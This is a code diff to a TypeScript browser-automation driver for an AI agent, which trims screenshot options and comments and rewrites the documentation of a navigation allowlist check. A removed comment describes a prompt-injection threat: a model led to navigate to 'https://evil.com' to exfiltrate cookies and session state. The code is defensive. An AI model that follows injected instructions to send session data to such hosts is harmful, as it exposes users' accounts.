@@ -1275,10 +1275,7 @@ export async function screenshot(tabId: number, signal?: AbortSignal): Promise<s
       const result = await sendCommand<CdpScreenshotResult>(
         tabId,
         'Page.captureScreenshot',
-        {
-          format: 'png',
-          quality: 80,
-        },
+        { format: 'png' },
         signal,
       );
       return result.data;
@@ -2208,12 +2205,10 @@ export async function getPageContent(tabId: number, signal?: AbortSignal): Promi
         const inspected = targets.elements();
         const lines = [];
 
-        // Title + URL
         lines.push('URL: ' + location.href);
         lines.push('TITLE: ' + document.title);
         lines.push('');
 
-        // Interactable elements with sequential integer indices (P1-2)
         const interactable = [
           ...inspected.elements.filter(el => el.localName !== 'iframe' && el.localName !== 'frame' && el.matches(${toScriptLiteral(INTERACTABLE_SELECTOR)})),
           ...inspected.elements.filter(el => el.matches('main,section,div,ul,ol,article')).slice(0, 2000).filter(el => {
@@ -2224,7 +2219,6 @@ export async function getPageContent(tabId: number, signal?: AbortSignal): Promi
         ];
         const uniqueInteractable = [...new Set(interactable)];
 
-        // Build index→{selector,signature} map as JSON for the caller to parse.
         // An element only receives an index once its own path has been proven
         // here to resolve back to that exact element and nothing else, so an
         // index the model is handed can never name two candidates.
@@ -2278,7 +2272,6 @@ export async function getPageContent(tabId: number, signal?: AbortSignal): Promi
         if (inspected.blockedFrames || inspected.limited) lines.push('Some controls were not inspected: cross-origin/inaccessible frames or the bounded snapshot limit. Use a fresh snapshot or manual interaction.');
         lines.push('Open shadow roots and same-origin frames are indexed. Closed shadow interiors are not inspected.');
 
-        // Visible text with content fencing (P2-6)
         lines.push('');
         lines.push(${toScriptLiteral(PAGE_CONTENT_FENCE_BEGIN)});
         const bodyText = (document.body?.innerText || '').replace(/\\s+/g, ' ').trim();
@@ -2360,20 +2353,14 @@ export function getOrigin(url: string): string {
 }
 
 /**
- * Asserts the site policy admits browser automation on a destination URL.
+ * Asserts the site policy admits browser automation on a destination URL. A
+ * scheme check alone would let an injected navigate reach an unapproved host, so
+ * the decision runs through the shared site policy engine: an origin the org
+ * blocked is refused even while it sits on the user's own allowlist, before the
+ * tab moves.
  *
- * P0 SECURITY FIX (Day-2):
- *   cdpDriver.navigate previously only validated the URL scheme. A prompt-
- *   injection or model hallucination could call navigate("https://evil.com")
- *   and exfiltrate cookies / session state to an unapproved host.
- *
- *   The decision now runs through the shared site policy engine, so an origin
- *   the org blocked is refused even while it sits on the user's own allowlist,
- *   and the CDP call is rejected BEFORE the tab moves.
- *
- * @throws {Error} with a message starting "navigate: " when the policy denies.
- *   This is caught by agentLoop → fed to model as a tool error so it can adapt
- *   (not crash the loop).
+ * @throws {Error} with a message starting "navigate: " when the policy denies;
+ *   agentLoop feeds it to the model as a tool error.
  */
 export async function assertDestinationAllowlisted(url: string): Promise<void> {
   const parsed = new URL(url);
